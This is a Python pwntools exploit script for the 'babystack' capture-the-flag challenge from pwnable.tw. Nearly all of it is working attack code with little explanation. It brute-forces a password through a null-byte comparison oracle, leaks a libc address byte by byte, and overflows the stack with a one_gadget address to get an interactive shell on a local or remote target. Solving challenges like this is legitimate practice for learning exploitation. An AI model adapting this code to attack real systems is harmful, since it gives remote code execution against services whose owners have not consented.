#/usr/env/bin python
#-*- coding: utf-8 -*- 
from pwn import *
import sys

def login(Psd):
    io.sendlineafter('>> ',str(1))
    io.sendafter('Your passowrd :',Psd)

def qu():
    io.sendlineafter('>> ',str(2))

def copy(Content):
    io.sendlineafter('>> ',str(3))
    io.sendafter('Copy :',Content)
    io.recvuntil('It is magic copy !\n')

def get_password():
    password = ""
    for i in range(0x10):
        for j in range(0x1,0x100):
            if j =='\n':
                continue
            login(password+chr(j)+'\x00')
            result = io.recvuntil('\n')
            if "Success" in result:
                io.sendlineafter('>> ',str(1))
                password += chr(j)
                log.info('password:'+password)
                break

    return password

def exploit(flag):
    #brute force password
    log.info('Getting password...')
    psd = get_password()

    login('\x00'+'1'*0x47)
    copy('1')

    io.sendlineafter('>> ',str(1))
    #brute force libc
    log.info('Getting libc...')
    address = "\x39"
    for i in range(0x4):
        for j in range(1,0x100):
            if j == '0xa':
                continue
            login("1"*8+address+chr(j)+'\x00')
            result = io.recvuntil('\n')
            if "Success" in result:
                io.sendlineafter('>> ',str(1))
                address += chr(j)
                log.info('address:'+address)
                break
    address+='\x7f'
    _IO_file_setbuf = u64(address.ljust(0x8,'\x00'))-9
    log.info('IO_file_setbuf:'+hex(_IO_file_setbuf))
    libc.address = _IO_file_setbuf-libc.symbols['_IO_file_setbuf']
    if flag==1:
        one_gadgets = libc.address+0xf0567
    else:
        #.....
        one_gadgets = libc.address+0xf0567 
    log.info('one_gadgets:'+hex(one_gadgets))

    #gdb.attach(io,'b *'+hex(proc_base+0x1051))
    payload = '\x00'+'1'*0x3f
    payload += psd
    payload += 6*p32(0xdeadbeef)
    payload += p64(one_gadgets)

    login(payload)
    copy('1')
    qu()
    io.sendline("id")
    flag = io.recv()
    log.info('flag:'+flag)
    io.interactive()


if __name__ == "__main__":
    context.binary = "./babystack"
    #context.terminal = ['tmux','sp','-h']
    context.log_level = 'debug'
    elf = ELF('./babystack')
    if len(sys.argv)>1:
        io = remote(sys.argv[1],sys.argv[2])
        libc=ELF('./babystack_libc_64.so.6')
        exploit(0)
    else:
        io = process('./babystack')
        libc = ELF('./babystack_libc_64.so.6')
        #libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        #proc_base = io.libs()['/mnt/hgfs/Binary/CTF/Shooting/pwnable.tw/babystack/workspace/babystack']
        #libc_base = io.libs()['/lib/x86_64-linux-gnu/libc.so.6']
        #log.info('proc_base:'+hex(proc_base))
        #log.info('libc_base:'+hex(libc_base))
        #io = process('',env={'LD_PRELOAD':''})
        #libc = ELF('')
        exploit(1)

